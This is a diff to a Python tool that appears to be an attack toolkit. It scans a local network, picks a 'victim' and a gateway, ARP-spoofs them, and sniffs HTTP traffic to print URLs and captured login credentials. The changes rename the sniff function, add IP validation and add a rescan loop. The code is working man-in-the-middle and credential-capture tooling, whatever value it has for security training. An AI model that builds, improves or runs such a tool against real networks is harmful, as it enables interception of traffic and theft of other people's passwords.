@@ -57,7 +57,6 @@ from arp_spoof import main_arp_spoof, stop_arp_spoof_background, is_arp_spoof_ac
 
 # Last scanned / selected victim IP (set when scanner stops and user enters a value)
 last_victim_ip: str | None = None
-last_interface: str | None = None
 
 # Warn if Scapy's pcap provider is not available
 try:
@@ -240,7 +239,7 @@ def choose_interface() -> str | None:
 # Packet sniffing
 # ---------------------------------------------------------------------------
 
-def sniff(interface: str, show_raw: bool, victim_ip: str | None = None) -> None:
+def start_sniff(interface: str, show_raw: bool, victim_ip: str | None = None) -> None:
     """Start sniffing on *interface*. Optionally filter to *victim_ip* only."""
     bpf_filter = f"host {victim_ip}" if victim_ip else None
     sniff_kwargs: dict = dict(
@@ -269,11 +268,7 @@ def process_sniffed_packet(packet, show_raw: bool) -> None:
         url_extractor(packet)
         login_data = get_login_info(packet)
         if login_data:
-            print(
-                f"{Fore.GREEN}[+] Credentials found >>> ",
-                login_data,
-                f"{Style.RESET_ALL}"
-            )
+            print(f"{Fore.GREEN}[+] Credentials found >>> {login_data}{Style.RESET_ALL}")
         if show_raw:
             raw_http_request(packet)
 
@@ -302,8 +297,12 @@ def get_login_info(packet) -> str | None:
 
 def url_extractor(packet) -> None:
     """Print the source IP, HTTP method, host and path from a packet."""
-    http_layer = packet.getlayer('HTTPRequest').fields
-    ip_layer = packet.getlayer('IP').fields
+    http_raw = packet.getlayer('HTTPRequest')
+    ip_raw = packet.getlayer('IP')
+    if not http_raw or not ip_raw:
+        return
+    http_layer = http_raw.fields
+    ip_layer = ip_raw.fields
     print(
         f"  {ip_layer['src']} requested:\n"
         f"  {http_layer['Method'].decode()} "
@@ -334,9 +333,18 @@ def raw_http_request(packet) -> None:
 # Packet Sniffer Module entry point
 # ---------------------------------------------------------------------------
 
+def _validate_ip(ip_str: str) -> bool:
+    """Return True if *ip_str* is a valid IPv4 or IPv6 address."""
+    try:
+        ipaddress.ip_address(ip_str)
+        return True
+    except ValueError:
+        return False
+
+
 def main_sniff() -> None:
     """Run the packet-sniffer module."""
-    global last_victim_ip, last_interface
+    global last_victim_ip
 
     print(f"\n{Fore.CYAN}{'='*55}")
     print(f"         Packet Sniffer Module")
@@ -358,12 +366,18 @@ def main_sniff() -> None:
         _info(f"Last victim IP: {victim_ip}")
         override = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Press Enter to sniff {victim_ip}, or type a new IP: ").strip()
         if override:
+            if not _validate_ip(override):
+                _err(f"Invalid IP address: {override}")
+                return
             victim_ip = override
         else:
             _ok(f"Using victim IP: {victim_ip}")
     else:
         victim_ip_input = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter target IP to filter (blank = all traffic): ").strip()
         if victim_ip_input:
+            if not _validate_ip(victim_ip_input):
+                _err(f"Invalid IP address: {victim_ip_input}")
+                return
             victim_ip = victim_ip_input
 
     # --- Raw mode ---
@@ -389,7 +403,7 @@ def main_sniff() -> None:
         print(f"   Press Ctrl+C to stop sniffing")
         print(f"{'─'*55}{Style.RESET_ALL}\n")
 
-        sniff(interface, show_raw, victim_ip)
+        start_sniff(interface, show_raw, victim_ip)
 
     except KeyboardInterrupt:
         print(f"\n\n{Fore.YELLOW}[!] Sniffing stopped.{Style.RESET_ALL}")
@@ -430,7 +444,7 @@ def print_menu() -> None:
 
 def main() -> None:
     """Application entry point — show menu and dispatch to modules."""
-    global last_victim_ip, last_interface
+    global last_victim_ip
 
     print(MENU_BANNER)
 
@@ -457,34 +471,38 @@ def main() -> None:
             if not interface:
                 _err("No interface selected — returning to menu.")
                 continue
-            last_interface = interface
 
-            # Single network scan
-            _info(f"Scanning network on {interface}...")
-            devices = scan_network_once(interface)
+
+            # --- Scan network (with rescan loop) ---
             devices_list: list[tuple[str, str]] = []
-            if devices:
-                devices_list = sorted(devices)
-                _ok(f"Discovered {len(devices)} device(s):")
-                t = PrettyTable(["#", "IP", "MAC Address"])
-                for idx, (ip_addr, mac) in enumerate(devices_list, start=1):
-                    t.add_row([idx, ip_addr, mac])
-                print(t)
-            else:
-                _warn("No devices found on network.")
-                retry = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Try again? (Y/N): ").strip().lower()
-                if retry == 'y':
-                    continue
+            while True:
+                _info(f"Scanning network on {interface}...")
+                devices = scan_network_once(interface)
+                if devices:
+                    devices_list = sorted(devices)
+                    _ok(f"Discovered {len(devices)} device(s):")
+                    t = PrettyTable(["#", "IP", "MAC Address"])
+                    for idx, (ip_addr, mac) in enumerate(devices_list, start=1):
+                        t.add_row([idx, ip_addr, mac])
+                    print(t)
                 else:
-                    _err("Cannot proceed without target.")
-                    continue
+                    _warn("No devices found on network.")
 
-            # --- Pick victim IP ---
-            try:
-                victim_input = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter Victim IP or # from table: ").strip()
-            except KeyboardInterrupt:
-                print(f"\n{Fore.RED}[!] Cancelled.{Style.RESET_ALL}")
-                continue
+                # --- Pick victim IP or rescan ---
+                try:
+                    victim_input = input(
+                        f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter Victim IP or # from table"
+                        f" ({Fore.YELLOW}R{Style.RESET_ALL} to rescan): "
+                    ).strip()
+                except KeyboardInterrupt:
+                    print(f"\n{Fore.RED}[!] Cancelled.{Style.RESET_ALL}")
+                    victim_input = ""
+                    break
+
+                if victim_input.lower() == 'r':
+                    continue  # rescan
+
+                break  # proceed with victim selection
 
             victim_ip: str | None = None
             if victim_input.isdigit() and devices_list:
@@ -493,6 +511,9 @@ def main() -> None:
                     victim_ip = devices_list[idx][0]
                     _ok(f"Selected victim: {victim_ip}")
             elif victim_input:
+                if not _validate_ip(victim_input):
+                    _err(f"Invalid IP address: {victim_input}")
+                    continue
                 victim_ip = victim_input
 
             if not victim_ip:
@@ -514,6 +535,9 @@ def main() -> None:
                 if 0 <= idx < len(devices_list):
                     gateway_ip = devices_list[idx][0]
             elif gw_input:
+                if not _validate_ip(gw_input):
+                    _err(f"Invalid IP address: {gw_input}")
+                    continue
                 gateway_ip = gw_input
 
             # --- Start ARP spoofing ---
